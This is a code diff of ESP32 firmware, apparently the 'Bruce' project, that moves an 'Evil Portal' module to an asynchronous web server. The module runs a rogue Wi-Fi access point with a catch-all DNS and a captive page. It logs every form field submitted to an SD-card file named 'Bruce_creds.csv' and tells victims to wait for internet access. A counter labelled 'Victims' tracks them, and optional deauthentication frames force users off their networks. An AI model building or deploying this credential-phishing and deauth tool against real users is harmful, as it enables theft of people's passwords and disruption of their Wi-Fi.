@@ -5,7 +5,7 @@
 #include "sd_functions.h"
 #include "wifi_atks.h"
 
-WebServer ep(80);               // initialise webserver
+AsyncWebServer *ep;               // initialise webserver
 DNSServer dnsServer;
 
 String html_file, ep_logo, last_cred;
@@ -23,9 +23,49 @@ const uint8_t deauth_frame_default2[] = {
     0xf0, 0xff, 0x02, 0x00
 };
 
+class CaptiveRequestHandler : public AsyncWebHandler {
+public:
+  CaptiveRequestHandler() {}
+  virtual ~CaptiveRequestHandler() {}
+
+  bool canHandle(AsyncWebServerRequest *request){
+    //request->addInterestingHeader("ANY");
+    return true;
+  }
+
+  void handleRequest(AsyncWebServerRequest *request) {
+    AsyncResponseStream *response = request->beginResponseStream("text/html");
+    if(request->hasParam("ssid")) request->redirect("/ssid");         // If there is a parameter called "ssid", changes network
+    else if(request->params()>0) {                                    // Else if there are other parameters, store in the memory
+      String html_temp = "<li>";                                      // Else.. after all that, redirects to the page
+      String csvLine = "";
+      last_cred="";
+      for (int i = 0; i < request->params(); i++) {
+        AsyncWebParameter *param = request->getParam(i);
+        html_temp += param->name() + ": " + param->value() + "<br>\n";
+        // Prepara dados para salvar no SD
+        if (i != 0) {
+          csvLine += ",";
+          last_cred +=",";
+        }
+        csvLine += param->name() + ": " + param->value();
+        last_cred += param->name().substring(0,1) + ": " + param->value();
+      }
+      html_temp += "</li>\n";
+      saveToCSV("/Bruce_creds.csv", csvLine);
+      capturedCredentialsHtml = html_temp + capturedCredentialsHtml;
+      totalCapturedCredentials++;
+      request->send(200, "text/html", getHtmlContents("Por favor, aguarde alguns minutos. Em breve você poderá acessar a internet.")); 
+    } 
+    else {
+      request->redirect("/"); 
+    }
+  }
+};
 
 void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
     bool redraw=true;
+    Serial.begin(115200);
     // Definição da matriz "Options"
     options = {
         {"Default", [=]()       { chooseHtml(false); }},
@@ -33,8 +73,9 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
     };
     delay(200);
     loopOptions(options);
+    
     while(checkNextPress()){ yield(); } // debounce
-
+    delay(200);
     //  tssid="" means that are opening a virgin Evil Portal
     if (tssid=="")  { 
       AP_name = keyboard("Free Wifi", 30, "Evil Portal SSID:"); 
@@ -46,101 +87,94 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
       AP_name = tssid;
     }
 
-
+    //while(checkNextPress()){ yield(); } // debounce
     delay(200);
     IPAddress AP_GATEWAY(172, 0, 0, 1);
     WiFi.mode(WIFI_AP);
     WiFi.softAPConfig(AP_GATEWAY, AP_GATEWAY, IPAddress(255, 255, 255, 0));
-    WiFi.softAP(AP_name,emptyString,channel,0,10,false);
+    while(!WiFi.softAP(AP_name)) { displayWarning("Wait please"); };
+    Serial.print("IP: "); Serial.println(WiFi.softAPIP());
     wifiConnected=true;
     dnsServer.start(53, "*", WiFi.softAPIP());
+    ep = new AsyncWebServer(80);
 
-    ep.on("/", [](){
-      ep.send(200, "text/html", html_file);
-    });
-    ep.on("/post", []() {
-      String html_temp = "<li>";                                      // Else.. after all that, redirects to the page
-      String csvLine = "";
-      last_cred="";
-      for (int i = 0; i < ep.args(); i++) {
-        html_temp += ep.argName(i) + ": " + ep.arg(i) + "<br>\n";
-        // Prepara dados para salvar no SD
-        if (i != 0) {
-          csvLine += ",";
-        }
-        csvLine += ep.argName(i) + ": " + ep.arg(i);
-        last_cred += ep.argName(i).substring(0,3) + ": " + ep.arg(i) + "\n";
-      }
-      html_temp += "</li>\n";
-      saveToCSV("/Bruce_creds.csv", csvLine);
-      capturedCredentialsHtml = html_temp + capturedCredentialsHtml;
-      totalCapturedCredentials++;
-      ep.send(200, "text/html", getHtmlContents("Por favor, aguarde alguns minutos. Em breve você poderá acessar a internet.")); 
+    // if url isn't found
+    ep->onNotFound([](AsyncWebServerRequest * request) {
+      request->redirect("/");
     });
 
-    ep.onNotFound([](){
-      ep.send(200, "text/html", html_file);
+    ep->on("/creds", HTTP_GET, [](AsyncWebServerRequest * request) {
+      request->send(200, "text/html", creds_GET());
     });
 
-    ep.on("/creds", []() {
-      ep.send(200, "text/html", creds_GET());
+    ep->on("/ssid", HTTP_GET, [](AsyncWebServerRequest * request) {
+      request->send(200, "text/html", ssid_GET());
     });
 
-    ep.on("/ssid", []() {
-      ep.send(200, "text/html", ssid_GET());
-    });
-
-    ep.on("/postssid", [](){
-      if(ep.hasArg("ssid")) AP_name = ep.arg("ssid").c_str();
-      ep.send(200, "text/html", ssid_POST());
-      ep.stop();                            // pára o servidor
+    ep->on("/postssid", HTTP_GET, [](AsyncWebServerRequest * request) {
+      if(request->hasArg("ssid")) AP_name = request->arg("ssid").c_str();
+      request->send(200, "text/html", ssid_POST());
+      ep->end();                            // pára o servidor
       wifiDisconnect();                     // desliga o WiFi
       WiFi.softAP(AP_name);                 // reinicia WiFi com novo SSID
-      ep.begin();                          // reinicia o servidor
+      ep->begin();                          // reinicia o servidor
       previousTotalCapturedCredentials=-1;  // redesenha a tela
     });
 
+    ep->on("/clear", HTTP_GET, [](AsyncWebServerRequest * request) { 
+      request->send(200, "text/html", clear_GET());
+    });
+
+    ep->on("/", HTTP_GET, [](AsyncWebServerRequest * request) {
+      request->send(200, "text/html", html_file);
+    });
+
+    ep->addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER); //only when requested from AP
     drawMainMenu();
     menu_op.deleteSprite();
     sprite.deleteSprite();
-    ep.begin();
+    ep->begin();
     tft.fillRect(6, 27, WIDTH-12, HEIGHT-33, BGCOLOR);
-    menu_op.deleteSprite();
-    menu_op.createSprite(WIDTH-20, HEIGHT-35);
+    //menu_op.deleteSprite();
+    //menu_op.createSprite(WIDTH-20, HEIGHT-35);
     
     bool hold_deauth = false;
     int tmp=millis(); // one deauth frame each 30ms at least
     redraw=true;
     while(1) {
       if(redraw) {
-        menu_op.fillRect(0,0,menu_op.width(), menu_op.height(),BGCOLOR);
-        menu_op.setTextSize(FM);
-        menu_op.setTextColor(TFT_RED);
-        menu_op.drawCentreString("Evil Portal",menu_op.width()/2, 3, SMOOTH_FONT);
-        menu_op.setCursor(0,20);
-        menu_op.setTextColor(FGCOLOR);
-        menu_op.println("AP: " + AP_name);
-        menu_op.println("->" + WiFi.softAPIP().toString() + "/creds");
-        menu_op.println("->" + WiFi.softAPIP().toString() + "/ssid");
-        menu_op.print("Victims: ");
-        menu_op.setTextColor(TFT_RED);
-        menu_op.println(String(totalCapturedCredentials));
-        menu_op.setTextSize(FP);
-        menu_op.println(last_cred);
+        tft.fillRect(10,26,WIDTH-20,HEIGHT-32,BGCOLOR);
+        tft.setTextSize(FM);
+        tft.setTextColor(TFT_RED);
+        tft.drawCentreString("Evil Portal",WIDTH/2, 29, SMOOTH_FONT);
+        tft.setCursor(7,49);
+        tft.setTextColor(FGCOLOR);
+        tft.println("AP: " + AP_name);
+        tft.setCursor(7,tft.getCursorY());
+        tft.println("->" + WiFi.softAPIP().toString() + "/creds");
+        tft.setCursor(7,tft.getCursorY());
+        tft.println("->" + WiFi.softAPIP().toString() + "/ssid");
+        tft.setCursor(7,tft.getCursorY());
+        tft.print("Victims: ");
+        tft.setTextColor(TFT_RED);
+        tft.println(String(totalCapturedCredentials));
+        tft.setCursor(7,tft.getCursorY());
+        tft.setTextSize(FP);
+        tft.println(last_cred);
 
         if (deauth){
           if (hold_deauth) {
-            menu_op.setTextSize(FP);
-            menu_op.setTextColor(FGCOLOR);
-            menu_op.drawRightString("Deauth OFF", menu_op.width(),menu_op.height()-8,SMOOTH_FONT);
+            tft.setTextSize(FP);
+            tft.setTextColor(FGCOLOR);
+            tft.drawRightString("Deauth OFF", WIDTH-7,HEIGHT-14,SMOOTH_FONT);
           } else {
-            menu_op.setTextSize(FP);
-            menu_op.setTextColor(TFT_RED);
-            menu_op.drawRightString("Deauth ON", menu_op.width(),menu_op.height()-8,SMOOTH_FONT);
+            tft.setTextSize(FP);
+            tft.setTextColor(TFT_RED);
+            tft.drawRightString("Deauth ON", WIDTH-7,HEIGHT-14,SMOOTH_FONT);
           }
         }
 
-        menu_op.pushSprite(8,26);
+        //menu_op.pushSprite(8,26);
         redraw=false;
       }
 
@@ -159,28 +193,33 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
         previousTotalCapturedCredentials = totalCapturedCredentials-1;
       }
       dnsServer.processNextRequest();
-      ep.handleClient();
 
       if(checkEscPress()) break;
     }
-    ep.close();
-    dnsServer.stop();
-    menu_op.deleteSprite();
+    ep->reset();
+    ep->end();
+    delete ep;
+    ep = nullptr;
 
     delay(100);
     wifiDisconnect();
+    //while(checkSelPress()) { yield(); } // timerless debounce
+    //displayWarning("Bruce will restart");
+    //while(!checkSelPress()) { }
+    // Evil Portal uses a lot of RAM memmory, and can't open Menus after that, need to restart.
+    //ESP.restart();
 }
 
 // Função para salvar dados no arquivo CSV
 void saveToCSV(const String &filename, const String &csvLine) {
   File file = SD.open(filename, FILE_APPEND);
   if (!file) {
-    log_i("Error to open file");
+    Serial.println("Error to open file");
     return;
   }
   file.println(csvLine);
   file.close();
-  log_i("data saved");
+  Serial.println("data saved");
 }
 
 String getHtmlContents(String body) {
